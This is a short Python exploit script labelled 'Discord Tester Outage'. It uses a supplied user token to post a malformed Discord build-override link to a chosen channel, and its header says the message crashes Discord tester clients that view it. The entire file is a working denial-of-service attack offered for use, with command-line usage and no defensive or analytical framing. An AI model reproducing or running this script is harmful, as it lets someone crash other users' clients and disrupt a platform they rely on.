# Name: Discord Tester Outage
# Description: Send a build override that causes any Discord testers with already overwritten build to crash
# Author: checksum (@0daySkid)
# Original founder: fweak, HellSec/Lucifer?

import requests
import sys

class Exploit:

    def __init__(self, token, channel):
        self.token = token
        self.channel_id = channel
        self.headers = {'Authorization': token}


    def execute(self):
        """ send malformed build override """
        return requests.post(f'https://discordapp.com/api/v6/channels/{self.channel_id}/messages', headers=self.headers, json={'content': 'https://discordapp.com/__development/link?s=%'})

    
def main():
    if len(sys.argv) < 3:
        print(f'Usage: py {sys.argv[0]} <token> <channel id>')
        sys.exit()

    token = sys.argv[1]
    channel_id = sys.argv[2]

    exploit = Exploit(token, channel_id)

    exploit.execute()


if __name__ == '__main__':
    main()
